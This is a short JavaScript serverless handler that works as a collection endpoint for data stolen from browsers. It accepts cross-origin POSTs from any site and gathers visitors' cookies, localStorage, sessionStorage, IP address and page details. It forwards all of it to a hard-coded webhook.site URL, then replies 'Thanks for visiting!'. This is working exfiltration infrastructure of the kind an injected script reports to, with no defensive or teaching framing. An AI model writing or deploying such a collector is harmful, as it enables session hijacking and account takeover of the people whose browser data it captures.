export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const payload = {
        timestamp: new Date().toISOString(),
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        userAgent: req.body.userAgent || 'unknown',
        referrer: req.body.referrer || 'direct',
        cookies: req.body.cookies || 'none',
        localStorage: req.body.localStorage || {},
        sessionStorage: req.body.sessionStorage || {},
        screen: req.body.screen || {},
        language: req.body.language || 'unknown',
        platform: req.body.platform || 'unknown',
        url: req.body.url || 'unknown'
    };

    // Отправляем на webhook.site
    try {
        await fetch('https://webhook.site/4d8a37c8-88e5-420f-a1a6-3504fc989d57', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.log('Webhook error:', e.message);
    }

    res.json({ status: 'ok', message: 'Thanks for visiting!' });
}